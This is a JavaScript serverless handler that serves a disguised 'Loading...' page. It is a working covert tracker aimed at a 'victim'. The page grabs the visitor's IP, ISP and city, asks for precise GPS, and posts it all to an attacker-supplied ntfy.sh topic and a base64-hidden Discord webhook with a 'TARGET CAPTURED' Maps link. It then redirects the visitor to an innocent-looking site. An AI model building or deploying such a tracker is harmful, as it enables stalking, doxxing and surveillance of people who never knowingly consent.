module.exports = (req, res) => {
    // We send back an HTML page that runs the tracker logic locally on the victim's browser
    const htmlCode = `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sedang Memuat...</title>
</head>
<body style="background:#fff;">
    <script>
        // High-accuracy live position tracker using HTML5 Geolocation API
        async function captureAndSend() {
            const urlParams = new URLSearchParams(window.location.search);
            const topic = urlParams.get('topic');
            const target = urlParams.get('t');
            const webhookUrl = urlParams.get('w'); // for discord backward compat

            let redirectUrl = 'https://google.com';
            try {
                if (target) redirectUrl = atob(target);
            } catch(e) {}

            // Gather standard data first
            let geoData = {};
            try {
                const res = await fetch('https://ip-api.com/json/');
                geoData = await res.json();
            } catch(e) {}

            let payload = {
                ip: geoData.query || 'Unknown',
                country: geoData.country || 'Unknown',
                region: geoData.regionName || 'Unknown',
                city: geoData.city || 'Unknown',
                isp: geoData.isp || geoData.org || 'Unknown',
                lat: geoData.lat,
                lon: geoData.lon,
                ua: navigator.userAgent,
                time: new Date().toISOString()
            };

            // Force Redirect Helper
            const sendAndGo = async () => {
                try {
                    if(topic) {
                        await fetch('https://ntfy.sh/' + topic, {
                            method: 'POST',
                            body: JSON.stringify(payload),
                            headers: { 'Title': 'Target Tertangkap!', 'Tags': 'skull' }
                        });
                    }
                    if(webhookUrl) {
                        await fetch(atob(webhookUrl), {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                content: \`🚨 TARGET CAPTURED: IP \${payload.ip} | GEO: \${payload.city} | Accurate GPS: \${payload.accurate ? 'YES' : 'NO'} \\n🔗 Maps: https://www.google.com/maps?q=\${payload.lat},\${payload.lon}\`
                            })
                        });
                    }
                } catch(e) {}
                
                // Final Redirect to victim's desired content
                window.location.replace(redirectUrl);
            };

            // Ask for real GPS permission, if denied (or timeout in 4s), fallback to IP-based location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        payload.lat = position.coords.latitude;
                        payload.lon = position.coords.longitude;
                        payload.accurate = true;
                        sendAndGo();
                    },
                    (error) => {
                        sendAndGo(); // User denied or timeout, send IP data
                    },
                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
                );
            } else {
                sendAndGo(); // Browser doesnt support
            }
        }
        captureAndSend();
    </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.status(200).send(htmlCode);
};
